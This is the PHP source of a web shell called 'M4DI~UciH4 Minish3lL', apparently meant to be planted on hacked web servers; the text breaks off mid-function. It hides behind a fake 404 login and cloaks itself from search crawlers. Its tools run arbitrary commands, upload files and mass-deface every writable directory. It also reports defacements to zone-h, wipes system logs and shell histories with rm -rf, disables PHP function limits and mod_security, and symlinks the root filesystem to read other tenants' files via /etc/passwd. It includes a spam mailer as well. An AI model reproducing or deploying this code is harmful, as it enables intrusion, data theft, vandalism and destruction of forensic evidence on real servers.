<?php

$auth_pass = "a81abbb5c8014fea20ae53a26bfef57e9892869d"; //sha1 =memek
            set_time_limit(0);
            error_reporting(0);
            ini_set('memory_limit', '64M');
            header('Content-Type: text/html; charset=UTF-8');
            if (!empty($_SERVER['HTTP_USER_AGENT'])) {
                $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
                if (preg_match("/Google|Slurp|MSNBot|ia_archiver|Yandex|Rambler/i", $_SERVER['HTTP_USER_AGENT'])) {
                    header('HTTP/1.0 404 Not Found');
                    exit;
                }
            }
            @session_start();
            @ini_set('error_log', NULL);
            @ini_set('log_errors', 0);
            @ini_set('max_execution_time', 0);
            @define('MADI_VERSION', '1.0');
            if (get_magic_quotes_gpc()) {
                function MADIstripslashes($array)
                {
                    return is_array($array) ? array_map('MADIstripslashes', $array) : stripslashes($array);
                }
                $_POST = MADIstripslashes($_POST);
            }
            function madiLogin()
            {
                die("<h1>Not Found</h1> \r\n<p>The requested URL was not found on this server.</p> \r\n<p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p> \r\n<hr> \r\n    <style> \r\n        input { margin:0;background-color:#fff;border:1px solid #fff; } \r\n    </style><form method=post><input type=password name=pass> </form>");
            }
            if (!isset($_SESSION[sha1($_SERVER['HTTP_HOST'])])) {
                if (empty($auth_pass) || isset($_POST['pass']) && sha1($_POST['pass']) == $auth_pass) {
                    $_SESSION[sha1($_SERVER['HTTP_HOST'])] = true;
                } else {
                    madiLogin();
                }
            }
            echo "<!DOCTYPE HTML>\r\n<html>\r\n<head>\r\n<link href=\"https://fonts.googleapis.com/css?family=Source+Serif+Pro|Sedgwick+Ave\" rel=\"stylesheet\">\r\n<title>403 Forbidden</title>\r\n<style>\r\nbody{\r\nfont-family:Source Serif Pro, sans-serif;\r\nbackground-color: #111111;\r\ncolor: white;\r\n}\r\n#content tr:hover{\r\nbackground-color: green;\r\n}\r\n#content .first{\r\nbackground-color: green;\r\n}\r\ntable{\r\nborder: 1px white solid;\r\n}\r\na{\r\ncolor: white;\r\ntext-decoration: none;\r\n}\r\na:hover{\r\ncolor:red;\r\n}\r\ninput,select,textarea{\r\nborder: 1px #000000 solid;\r\n-moz-border-radius: 5px;\r\n-webkit-border-radius:5px;\r\nborder-radius:5px;\r\n}\r\nh1{ color: #000; text-decoration: none; border-radius:0px; border:0px;margin:0px; padding:0px; animation:sec666 0.5s linear infinite;} @keyframes sec666{2%{color:#fff;}3%{transform:translate(2px,-10px) skewX(3240deg);}5%{transform:translate(0px,0px) skewX(0deg);}2% , 54%{transform:translateX(0px) skew(0deg);}55%{transform:translate(-2px,6px) skew(-5530deg);}56%{transform:translate(0px,0px) skew(0deg);}57%{transform:translate(4px,-10px) skew(-70deg);}58%{transform:translate(0px,0px) skew(0deg);}62%{transform:translate(0px,20px) skew(0deg);}63%{transform:translate(4px,-2px) skew(0deg);}90%{transform:translate(1px,3px); skew(-230deg);}95%{transform:translate(-7px,2px); skew(-120deg);}100%{transform:translate(0px,0px) skew(0deg);}\r\n#Container{\r\n\t\twidth: 80%;\r\n\t\tmargin:0 auto;\r\n\t\tbackground: #eee;\r\n\t\tpadding: 5px;\r\n\t}\r\n\t.full{\r\n\t\twidth: 90%;\r\n\t\tdisplay: block;\r\n\t\tmargin: 0 auto;\r\n\t}\r\n</style>\r\n</head>\r\n<center><br><h1 style=\"font-family: Sedgwick Ave;\"><font color=\"white\" size=\"6\">&#1203;&#824;&#1202;&#824;&#1203 M4DI~UciH4 Minish3lL &#1203;&#824;&#1202;&#824;&#1203</font></h1><br>\r\n<table width=\"700\" border=\"0\" cellpadding=\"0\" cellspacing=\"1\" align=\"center\">\r\n<tr><td><font color=\"white\">Path :</font> ";
            if (isset($_GET['path'])) {
                $path = $_GET['path'];
            } else {
                $path = getcwd();
            }
            $path = str_replace('\\', '/', $path);
            $paths = explode('/', $path);
            foreach ($paths as $id => $pat) {
                if ($pat == '' && $id == 0) {
                    $a = true;
                    echo "<a href=\"?path=/\">/</a>";
                    continue;
                }
                if ($pat == '') {
                    continue;
                }
                echo "<a href=\"?path=";
                for ($i = 0; $i <= $id; $i++) {
                    echo "{$paths[$i]}";
                    if ($i != $id) {
                        echo "/";
                    }
                }
                echo '">' . $pat . '</a>/';
            }
            echo "</td></tr><tr><td>";
            if (isset($_FILES['file'])) {
                if (copy($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
                    echo "<font color=\"lime\">OK</font><br />";
                } else {
                    echo "<font color=\"red\">ERROR!</font><br/>";
                }
            }
            if (isset($_GET['dir'])) {
                $dir = $_GET['dir'];
                chdir($dir);
            } else {
                $dir = getcwd();
            }
            $ip = gethostbyname($_SERVER['HTTP_HOST']);
            $kernel = php_uname();
            $ip_web = gethostbyname($_SERVER['HTTP_HOST']);
            $ds = @ini_get("disable_functions");
            $show_ds = !empty($ds) ? "<font color=red>{$ds}</font>" : "<font color=lime>Clear</font>";
            if (!function_exists('posix_getegid')) {
                $user = @get_current_user();
                $uid = @getmyuid();
                $gid = @getmygid();
                $group = "?";
            } else {
                $uid = @posix_getpwuid(posix_geteuid());
                $gid = @posix_getgrgid(posix_getegid());
                $user = $uid['name'];
                $uid = $uid['uid'];
                $group = $gid['name'];
                $gid = $gid['gid'];
            }
            echo "Disable Functions : {$show_ds}<br>";
            echo "System : <font color=lime>" . $kernel . "</font><br>";
            echo "IP Address : <font color=lime>" . $ip_web . "</font><br>";
            echo "<center><hr>";
            echo "<font color='lime'>[ </font><a href='?'>Home</a><font color='lime'> ]</font> - ";
            echo "<font color='lime'>[ </font><a href='?dir={$dir}&to=upload'>Upload</a><font color='lime'> ]</font> - ";
            echo "<font color='lime'>[ </font><a href='?dir={$dir}&to=cmd'>Command</a><font color='lime'> ]</font> - ";
            echo "<font color='lime'>[ </font><a href='?dir={$dir}&to=zoneh'>Zone- H</a><font color='lime'> ]</font> - ";
            echo "<font color='lime'>[ </font><a href='?dir={$dir}&to=jumping'>Jumping</a><font color='lime'> ]</font> - ";
            echo "<font color='lime'>[ </font><a href='?dir={$dir}&to=sym'>Symlink</a><font color='lime'> ]</font> - ";
            echo "<font color='lime'>[ </font><a href='?dir={$dir}&to=adm'>Adminer</a><font color='lime'> ]</font> - ";
            echo "<font color='lime'>[ </font><a href='?dir={$dir}&to=hashid'>Hash ID</a><font color='lime'> ]</font>";
            echo "<font color='lime'>[ </font><a href='?dir={$dir}&to=vhost'>Bypass Vhost</a><font color='lime'> ]</font> - ";
            echo "<font color='lime'>[ </font><a href='?dir={$dir}&to=mailer'>Mailer</a><font color='lime'> ]</font> - ";
            echo "<font color='lime'>[ </font><a href='?dir={$dir}&to=mass'>Mass Deface</a><font color='lime'> ]</font> - ";
            echo "<font color='lime'>[ </font><a href='?dir={$dir}&to=domains'>Domains</a><font color='lime'> ]</font> - ";
            echo "<font color='lime'>[ </font><a href='?dir={$dir}&to=disablefunc'>Disable Functions</a><font color='lime'> ]</font>";
            echo "<font color='lime'>[ </font><a href='?dir={$dir}&to=dellogs'>Delete Logs</a><font color='lime'> ]</font> ";
            echo "<hr>";
            echo "</center>";
            echo "<hr>";
            if ($_GET['to'] == 'zoneh') {
                if ($_POST['submit']) {
                    $domain = explode("\r\n", $_POST['url']);
                    $nick = $_POST['nick'];
                    echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier={$nick}/published=0' target='_blank'>http://www.zone-h.org/archive/notifier={$nick}/published=0</a><br>";
                    echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier={$nick}' target='_blank'>http://www.zone-h.org/archive/notifier={$nick}</a><br><br>";
                    function zoneh($url, $nick)
                    {
                        $ch = curl_init("http://www.zone-h.com/notify/single");
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                        curl_setopt($ch, CURLOPT_POST, true);
                        curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer={$nick}&domain1={$url}&hackmode=1&reason=1&submit=Send");
                        return curl_exec($ch);
                    }
                    foreach ($domain as $url) {
                        $zoneh = zoneh($url, $nick);
                        if (preg_match("/color=\"red\">OK<\\/font><\\/li>/i", $zoneh)) {
                            echo "{$url} -> <font color=lime>OK</font><br>";
                        } else {
                            echo "{$url} -> <font color=red>ERROR</font><br>";
                        }
                    }
                } else {
                    echo "<center><form method='post'>\r\n\t\t<u>Defacer</u>: <br>\r\n\t\t<input type='text' name='nick' size='50' placeholder='Nickname'><br>\r\n\t\t<u>Domains</u>: <br>\r\n\t\t<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>\r\n\t\t<input type='submit' name='submit' value='Submit' style='width: 450px;'>\r\n\t\t</form>";
                }
                echo "</center>";
            } elseif ($_GET['to'] == 'mass') {
                function sabun_massal($dir, $namafile, $isi_script)
                {
                    if (is_writable($dir)) {
                        $dira = scandir($dir);
                        foreach ($dira as $dirb) {
                            $dirc = "{$dir}/{$dirb}";
                            $lokasi = $dirc . '/' . $namafile;
                            if ($dirb === '.') {
                                file_put_contents($lokasi, $isi_script);
                            } elseif ($dirb === '..') {
                                file_put_contents($lokasi, $isi_script);
                            } else {
                                if (is_dir($dirc)) {
                                    if (is_writable($dirc)) {
                                        echo "[<font color=lime>DONE</font>] {$lokasi}<br>";
                                        file_put_contents($lokasi, $isi_script);
                                        $idx = sabun_massal($dirc, $namafile, $isi_script);
                                    }
                                }
                            }
                        }
                    }
                }
                function sabun_biasa($dir, $namafile, $isi_script)
                {
                    if (is_writable($dir)) {
                        $dira = scandir($dir);
                        foreach ($dira as $dirb) {
                            $dirc = "{$dir}/{$dirb}";
                            $lokasi = $dirc . '/' . $namafile;
                            if ($dirb === '.') {
                                file_put_contents($lokasi, $isi_script);
                            } elseif ($dirb === '..') {
                                file_put_contents($lokasi, $isi_script);
                            } else {
                                if (is_dir($dirc)) {
                                    if (is_writable($dirc)) {
                                        echo "<font color=white>http://</font>{$dirb}/{$namafile}<br>";
                                        file_put_contents($lokasi, $isi_script);
                                    }
                                }
                            }
                        }
                    }
                }
                if ($_POST['start']) {
                    if ($_POST['tipe_sabun'] == 'mahal') {
                        echo "<div style='margin: 5px auto; padding: 5px'>";
                        sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
                        echo "</div>";
                    } elseif ($_POST['tipe_sabun'] == 'murah') {
                        echo "<div style='margin: 5px auto; padding: 5px'>";
                        sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
                        echo "</div>";
                    }
                } else {
                    echo "<center>";
                    echo "<form method='post'>\r\n\t<font style='text-decoration: none;'>Tipe Mass:</font><br>\r\n\t<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>\r\n\t<font style='text-decoration: none;'>Folder:</font><br>\r\n\t<input type='text' name='d_dir' value='{$dir}' style='width: 450px;' height='10'><br>\r\n\t<font style='text-decoration: none;'>Filename:</font><br>\r\n\t<input type='text' name='d_file' value='kontol.php' style='width: 450px;' height='10'><br>\r\n\t<font style='text-decoration: none;'>Index File:</font><br>\r\n\t<textarea name='script' style='width: 450px; height: 200px;'>Hacked by M4DI~UciH4</textarea><br>\r\n\t<input type='submit' name='start' value='tusbol COK!' style='width: 450px;'>\r\n\t</form></center>";
                }
            } elseif ($_GET['to'] == 'dellogs') {
                echo "<br><center>^_^ Delete Logs For Save Bro ^_^<center><br>";
                echo "<table style='margin: 0 auto;'><tr valign='top'><td align='left'>";
                exec("rm -rf /tmp/logs");
                exec("rm -rf /root/.ksh_history");
                exec("rm -rf /root/.bash_history");
                exec("rm -rf /root/.bash_logout");
                exec("rm -rf /usr/local/apache/logs");
                exec("rm -rf /usr/local/apache/log");
                exec("rm -rf /var/apache/logs");
                exec("rm -rf /var/apache/log");
                exec("rm -rf /var/run/utmp");
                exec("rm -rf /var/logs");
                exec("rm -rf /var/log");
                exec("rm -rf /var/adm");
                exec("rm -rf /etc/wtmp");
                exec("rm -rf /etc/utmp");
                exec("rm -rf {$HISTFILE}");
                exec("rm -rf /var/log/lastlog");
                exec("rm -rf /var/log/wtmp");
                shell_exec("rm -rf /tmp/logs");
                shell_exec("rm -rf /root/.ksh_history");
                shell_exec("rm -rf /root/.bash_history");
                shell_exec("rm -rf /root/.bash_logout");
                shell_exec("rm -rf /usr/local/apache/logs");
                shell_exec("rm -rf /usr/local/apache/log");
                shell_exec("rm -rf /var/apache/logs");
                shell_exec("rm -rf /var/apache/log");
                shell_exec("rm -rf /var/run/utmp");
                shell_exec("rm -rf /var/logs");
                shell_exec("rm -rf /var/log");
                shell_exec("rm -rf /var/adm");
                shell_exec("rm -rf /etc/wtmp");
                shell_exec("rm -rf /etc/utmp");
                shell_exec("rm -rf {$HISTFILE}");
                shell_exec("rm -rf /var/log/lastlog");
                shell_exec("rm -rf /var/log/wtmp");
                passthru("rm -rf /tmp/logs");
                passthru("rm -rf /root/.ksh_history");
                passthru("rm -rf /root/.bash_history");
                passthru("rm -rf /root/.bash_logout");
                passthru("rm -rf /usr/local/apache/logs");
                passthru("rm -rf /usr/local/apache/log");
                passthru("rm -rf /var/apache/logs");
                passthru("rm -rf /var/apache/log");
                passthru("rm -rf /var/run/utmp");
                passthru("rm -rf /var/logs");
                passthru("rm -rf /var/log");
                passthru("rm -rf /var/adm");
                passthru("rm -rf /etc/wtmp");
                passthru("rm -rf /etc/utmp");
                passthru("rm -rf {$HISTFILE}");
                passthru("rm -rf /var/log/lastlog");
                passthru("rm -rf /var/log/wtmp");
                system("rm -rf /tmp/logs");
                sleep(2);
                echo "<br>Deleting .../tmp/logs ";
                sleep(2);
                system("rm -rf /root/.bash_history");
                sleep(2);
                echo "<p>Deleting .../root/.bash_history </p>";
                system("rm -rf /root/.ksh_history");
                sleep(2);
                echo "<p>Deleting .../root/.ksh_history </p>";
                system("rm -rf /root/.bash_logout");
                sleep(2);
                echo "<p>Deleting .../root/.bash_logout </p>";
                system("rm -rf /usr/local/apache/logs");
                sleep(2);
                echo "<p>Deleting .../usr/local/apache/logs </p>";
                system("rm -rf /usr/local/apache/log");
                sleep(2);
                echo "<p>Deleting .../usr/local/apache/log </p>";
                system("rm -rf /var/apache/logs");
                sleep(2);
                echo "<p>Deleting .../var/apache/logs </p>";
                system("rm -rf /var/apache/log");
                sleep(2);
                echo "<p>Deleting .../var/apache/log </p>";
                system("rm -rf /var/run/utmp");
                sleep(2);
                echo "<p>Deleting .../var/run/utmp </p>";
                system("rm -rf /var/logs");
                sleep(2);
                echo "<p>Deleting .../var/logs </p>";
                system("rm -rf /var/log");
                sleep(2);
                echo "<p>Deleting .../var/log </p>";
                system("rm -rf /var/adm");
                sleep(2);
                echo "<p>Deleting .../var/adm </p>";
                system("rm -rf /etc/wtmp");
                sleep(2);
                echo "<p>Deleting .../etc/wtmp </p>";
                system("rm -rf /etc/utmp");
                sleep(2);
                echo "<p>Deleting .../etc/utmp </p>";
                system("rm -rf {$HISTFILE}");
                sleep(2);
                echo "<p>Deleting ...\$HISTFILE </p>";
                system("rm -rf /var/log/lastlog");
                sleep(2);
                echo "<p>Deleting .../var/log/lastlog </p>";
                system("rm -rf /var/log/wtmp");
                sleep(2);
                echo "<p>Deleting .../var/log/wtmp </p>";
                sleep(4);
                echo "<br><br><p>Your Traces Has Been Successfully Deleting ...From the Server";
                echo "</td></tr></table>";
            } elseif ($_GET['to'] == 'domains') {
                echo "<center><h4>Domains and Users</h4>";
                $d0mains = @file("/etc/named.conf");
                if (!$d0mains) {
                    die("<center>Error : can't read [ /etc/named.conf ]</center>");
                }
                echo "<table id=\"output\"><tr bgcolor=#cecece><td>Domains</td><td>users</td></tr>";
                foreach ($d0mains as $d0main) {
                    if (eregi("zone", $d0main)) {
                        preg_match_all('#zone "(.*)"#', $d0main, $domains);
                        flush();
                        if (strlen(trim($domains[1][0])) > 2) {
                            $user = posix_getpwuid(@fileowner("/etc/valiases/" . $domains[1][0]));
                            echo "<tr><td><a href=http://www." . $domains[1][0] . "/>" . $domains[1][0] . "</a></td><td>" . $user['name'] . "</td></tr>";
                            flush();
                        }
                    }
                }
                echo "</div></center>";
            } elseif ($_GET['to'] == 'disablefunc') {
                echo "<center><h4><br>Bypass Disable Functions</h4>";
                echo "<form method=post><input type=submit name=ini value='php.ini' />&nbsp;<input type=submit name=htce value='.htaccess' /></form>";
                if (isset($_POST['ini'])) {
                    $file = fopen("php.ini", "w");
                    echo fwrite($file, "disable_functions=none\r\nsafe_mode = Off\r\n\t");
                    fclose($file);
                    echo "<a href='php.ini'>Click here!</a>";
                }
                if (isset($_POST['htce'])) {
                    $file = fopen(".htaccess", "w");
                    echo fwrite($file, "<IfModule mod_security.c>\r\nSecFilterEngine Off\r\nSecFilterScanPOST Off\r\n</IfModule>\r\n\t");
                    fclose($file);
                    echo ".htaccess Successfully created!";
                }
                echo "</br></center>";
            } elseif ($_GET['to'] == 'logout') {
                echo "<script>alert('Byee :*')</script>";
                unset($_SESSION[sha1($_SERVER['HTTP_HOST'])]);
                echo "<script>window.location='?';</script>";
            } elseif ($_GET['to'] == 'sym') {
                echo "<hr>"; 
                    $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
                    $d0mains = @file("/etc/named.conf");
                    ##httaces
                    if ($d0mains) {
                        @mkdir("madi_sym", 0777);
                        @chdir("madi_sym");
                        @exec("ln -s / root");
                        $file3 = 'Options Indexes FollowSymLinks
DirectoryIndex madi.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
                        $fp3 = fopen('.htaccess', 'w');
                        $fw3 = fwrite($fp3, $file3);
                        @fclose($fp3);
                        echo "\r\n<table align=center border=3 style='width:60%;border-color:#8B0000;'>\r\n<tr>\r\n<td align=center><font color=lime size=2>S. No.</font></td>\r\n<td align=center><font color=lime size=2>Domains</font></td>\r\n<td align=center><font color=lime size=2>Users</font></td>\r\n<td align=center><font color=lime size=2>Symlink</font></td>\r\n</tr>";
                        $dcount = 1;
                        foreach ($d0mains as $d0main) {
                            if (eregi("zone", $d0main)) {
                                preg_match_all('#zone "(.*)"#', $d0main, $domains);
                                flush();
                                if (strlen(trim($domains[1][0])) > 2) {
                                    $user = posix_getpwuid(@fileowner("/etc/valiases/" . $domains[1][0]));
                                    echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>\r\n<td align=left><a href=http://www." . $domains[1][0] . "/><font class=txt>" . $domains[1][0] . "</font></a></td>\r\n<td>" . $user['name'] . "</td>\r\n<td><a href='{$full}/madi_sym/root/home/" . $user['name'] . "/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
                                    flush();
                                    $dcount++;
                                }
                            }
                        }
                        echo "</table>";
                    } else {
                        $TEST = @file('/etc/passwd');
                        if ($TEST) {
                            @mkdir("madi_sym", 0777);
                            @chdir("madi_sym");
                            exec("ln -s / root");
                            $file3 = 'Options Indexes FollowSymLinks
DirectoryIndex madi.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
                            $fp3 = fopen('.htaccess', 'w');
                            $fw3 = fwrite($fp3, $file3);
                            @fclose($fp3);
                            echo "\r\n <table align=center border=1><tr>\r\n <td align=center><font size=3>S. No.</font></td>\r\n <td align=center><font size=3>Users</font></td>\r\n <td align=center><font size=3>Symlink</font></td></tr>";
                            $dcount = 1;
                            $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
                            while (!feof($file)) {
                                $s = fgets($file);
                                $matches = array();
                                $t = preg_match('//(.*?)://s', $s, $matches);
                                $matches = str_replace("home/", "", $matches[1]);
                                if (strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named") {
                                    continue;
                                }
                                echo "<tr><td align=center><font size=2>" . $dcount . "</td>\r\n <td align=center><font class=txt>" . $matches . "</td>";
                                echo "<td align=center><font class=txt><a href={$full}/madi_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
                                $dcount++;
                            }
                            fclose($file);
                            echo "</table>";
                        } else {
                            if ($os != "Windows") {
                                @mkdir("madi_sym", 0777);
                                @chdir("madi_sym");
                                @exe("ln -s / root");
                                $file3 = '
 Options Indexes FollowSymLinks
DirectoryIndex 008
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
';
                                $fp3 = fopen('.htaccess', 'w');
                                $fw3 = fwrite($fp3, $file3);
                                @fclose($fp3);
                                echo "\r\n <center><h2 class='k2ll33d2'>Symlink Server</h2>\r\n <table align=center border=1><tr>\r\n <td align=center><font size=3>ID</font></td>\r\n <td align=center><font size=3>Users</font></td>\r\n <td align=center><font size=3>Symlink</font></td></tr>";
                                $temp = "";
                                $val1 = 0;
                                $val2 = 1000;
                                for (; $val1 <= $val2; $val1++) {
                                    $uid = @posix_getpwuid($val1);
                                    if ($uid) {
                                        $temp .= join(':', $uid) . "n";
                                    }
                                }
                                echo "<br/>";
                                $temp = trim($temp);
                                $file5 = fopen("test.txt", "w");
                                fputs($file5, $temp);
                                fclose($file5);
                                $dcount = 1;
                                $file = fopen("test.txt", "r") or exit("Unable to open file!");
                                while (!feof($file)) {
                                    $s = fgets($file);
                                    $matches = array();
                                    $t = preg_match('//(.*?)://s', $s, $matches);
                                    $matches = str_replace("home/", "", $matches[1]);
                                    if (strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named") {
                                        continue;
                                    }
                                    echo "<tr><td align=center><font size=2>" . $dcount . "</td>\r\n <td align=center><font class=txt>" . $matches . "</td>";
                                    echo "<td align=center><font class=txt><a href={$full}/madi_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
                                    $dcount++;
                                }
                                fclose($file);
                                echo "</table></div></center>";
                                unlink("test.txt");
                            } else {
                                echo "<center><font size=3>Cannot create Symlink</font></center>";
                            }
                        }
                    }
            } elseif ($_GET['to'] == 'jumping') {
                $i = 0;
                echo "<div class='margin: 5px auto;'>";
                if (preg_match("/hsphere/", $dir)) {
                    $urls = explode("\r\n", $_POST['url']);
                    if (isset($_POST['jump'])) {
                        echo "<pre>";
                        foreach ($urls as $url) {
                            $url = str_replace(array("http://", "www."), "", strtolower($url));
                            $etc = "/etc/passwd";
                            $f = fopen($etc, "r");
                            while ($gets = fgets($f)) {
                                $pecah = explode(":", $gets);
                                $user = $pecah[0];
                                $dir_user = "/hsphere/local/home/{$user}";
                                if (is_dir($dir_user) === true) {
                                    $url_user = $dir_user . "/" . $url;
                                    if (is_readable($url_user)) {
                                        $i++;
                                        $jrw = "[<font color=lime>R</font>] <a href='?dir={$url_user}'><font color=gold>{$url_user}</font></a>";
                                        if (is_writable($url_user)) {
                                            $jrw = "[<font color=lime>RW</font>] <a href='?dir={$url_user}'><font color=gold>{$url_user}</font></a>";
                                        }
                                        echo $jrw . "<br>";
                                    }
                                }
                            }
                        }
                        if ($i == 0) {
                        } else {
                            echo "<br>Total ada " . $i . " Kamar di " . $ip;
                        }
                        echo "</pre>";
                    } else {
                        echo "<center>\r\n\t\t\t\t  <form method=\"post\">\r\n\t\t\t\t  List Domains: <br>\r\n\t\t\t\t  <textarea name=\"url\" style=\"width: 500px; height: 250px;\">";
                        $fp = fopen("/hsphere/local/config/httpd/sites/sites.txt", "r");
                        while ($getss = fgets($fp)) {
                            echo $getss;
                        }
                        echo "</textarea><br>\r\n\t\t\t\t  <input type=\"submit\" value=\"Jumping\" name=\"jump\" style=\"width: 500px; height: 25px;\">\r\n\t\t\t\t  </form></center>";
                    }
                } elseif (preg_match("/vhosts|vhost/", $dir)) {
                    preg_match("/\\/var\\/www\\/(.*?)\\//", $dir, $vh);
                    $urls = explode("\r\n", $_POST['url']);
                    if (isset($_POST['jump'])) {
                        echo "<pre>";
                        foreach ($urls as $url) {
                            $url = str_replace("www.", "", $url);
                            $web_vh = "/var/www/" . $vh[1] . "/{$url}/httpdocs";
                            if (is_dir($web_vh) === true) {
                                if (is_readable($web_vh)) {
                                    $i++;
                                    $jrw = "[<font color=lime>R</font>] <a href='?dir={$web_vh}'><font color=gold>{$web_vh}</font></a>";
                                    if (is_writable($web_vh)) {
                                        $jrw = "[<font color=lime>RW</font>] <a href='?dir={$web_vh}'><font color=gold>{$web_vh}</font></a>";
                                    }
                                    echo $jrw . "<br>";
                                }
                            }
                        }
                        if ($i == 0) {
                        } else {
                            echo "<br>Total ada " . $i . " Kamar di " . $ip;
                        }
                        echo "</pre>";
                    } else {
                        echo "<center>\r\n\t\t\t\t  <form method=\"post\">\r\n\t\t\t\t  List Domains: <br>\r\n\t\t\t\t  <textarea name=\"url\" style=\"width: 500px; height: 250px;\">";
                        bing("ip:{$ip}");
                        echo "</textarea><br>\r\n\t\t\t\t  <input type=\"submit\" value=\"Jumping\" name=\"jump\" style=\"width: 500px; height: 25px;\">\r\n\t\t\t\t  </form></center>";
                    }
                } else {
                    echo "<pre>";
                    $etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
                    while ($passwd = fgets($etc)) {
                        if ($passwd == '' || !$etc) {
                            echo "<font color=red>Can't read /etc/passwd</font>";
                        } else {
                            preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
                            foreach ($user_jumping[1] as $user_idx_jump) {
                                $user_jumping_dir = "/home/{$user_idx_jump}/public_html";
                                if (is_readable($user_jumping_dir)) {
                                    $i++;
                                    $jrw = "[<font color=lime>R</font>] <a href='?dir={$user_jumping_dir}'><font color=gold>{$user_jumping_dir}</font></a>";
                                    if (is_writable($user_jumping_dir)) {
                                        $jrw = "[<font color=lime>RW</font>] <a href='?dir={$user_jumping_dir}'><font color=gold>{$user_jumping_dir}</font></a>";
                                    }
                                    echo $jrw;
                                    if (function_exists('posix_getpwuid')) {
                                        $domain_jump = file_get_contents("/etc/named.conf");
                                        if ($domain_jump == '') {
                                            echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
                                        } else {
                                            preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
                                            foreach ($domains_jump[1] as $dj) {
                                                $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/{$dj}"));
                                                $user_jumping_url = $user_jumping_url['name'];
                                                if ($user_jumping_url == $user_idx_jump) {
                                                    echo " => ( <u>{$dj}</u> )<br>";
                                                    break;
                                                }
                                            }
                                        }
                                    } else {
                                        echo "<br>";
                                    }
                                }
                            }
                        }
                    }
                    if ($i == 0) {
                    } else {
                        echo "<br>Total ada " . $i . " Kamar di " . $ip;
                    }
                    echo "</pre>";
                }
                echo "</div>";
            } elseif ($_GET['to'] == 'cmd') {
                echo "<form method='post'>\r\n<br>\r\n</br>\r\n<font color='white'>Command:</font>\r\n<input type='text' size='30' height='10' name='cmd'><input type='submit' name='execmd' value=' Execute '>\r\n</form>\r\n</td></tr>";
                if ($_POST['execmd']) {
                    echo "<center><textarea cols='60' rows='10' readonly='readonly' style='color:black; background-color:white;'>" . exe($_POST['cmd']) . "</textarea></center>";
                }
            } elseif ($_GET['to'] == 'upload') {
                echo "<center><form enctype=\"multipart/form-data\" method=\"POST\">\r\n<font color=\"white\">File Upload :</font> <input type=\"file\" name=\"file\" />\r\n<input type=\"submit\" value=\"Upload\" />\r\n</form></center>";
            } elseif ($_GET['to'] == 'mailer') {
                ?><center><div id="Container">
		<h2>Simple Mailer</h2>
		<form method="post">
			<label class="full" for="From">From :</label><br>
			<input class="full" type="text" id="From" name="From"/><br>
			<label class="full" for="Subject">Subject :</label><br>
			<input class="full" type="text" id="Subject" name="Subject"/><br>
			<label class="full" for="Name">Name :</label><br>
			<input class="full" type="text" id="Name" name="Name"/><br>
			<label class="full" for="Message">Message :</label><br>
			<textarea class="full" name="Message" id="Message" rows="10" cols="30"></textarea><br>
			<label class="full" for="Emails">Emails :</label><br>
			<textarea class="full" name="Emails" id="Emails" rows="10" cols="30"></textarea><br>
			<input type="hidden" name="send">
			<button id="Send" style="Width:50px;height:20px;display:block;margin:0 auto;background:black;color:white;">Send</button>
		</form>
	</div>
	<?php 
                if (@isset($_POST['send'])) {
                    $From = $_POST['From'];
                    $Subject = $_POST['Subject'];
                    $Message = $_POST['Message'];
                    $Emails = $_POST['Emails'];
                    $Name = $_POST['Name'];
                    $headers = "MIME-Version: 1.0\r\n";
                    $headers = "MIME-Version: 1.0\r\nContent-type:text/html;charset=UTF-8\r\n";
                    $headers .= "From: <" . $From . ">\r\n";
                    $headers .= "Cc: " . $Name . "\r\n";
                    $Emails = explode("\r\n", $_POST['Emails']);
                    foreach ($Emails as $email) {
                        mail($email, $Subject, $Message, $headers);
                        echo "<br>Sending Email To : " . $email . " -> Done";
                    }
                }
                echo "</center>";
            } elseif ($_GET['to'] == 'vhost') {
                echo "<form method='POST' action=''>";
                echo "<center><br><font size='6'>Bypass Symlink vHost</font><br><br>";
                echo "<center><input type='submit' value='Bypass it' name='Colii'></center>";
                if (isset($_POST['Colii'])) {
                    system('ln -s / madi.txt');
                    $fvckem = 'T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhw';
                    $file = fopen(".htaccess", "w+");
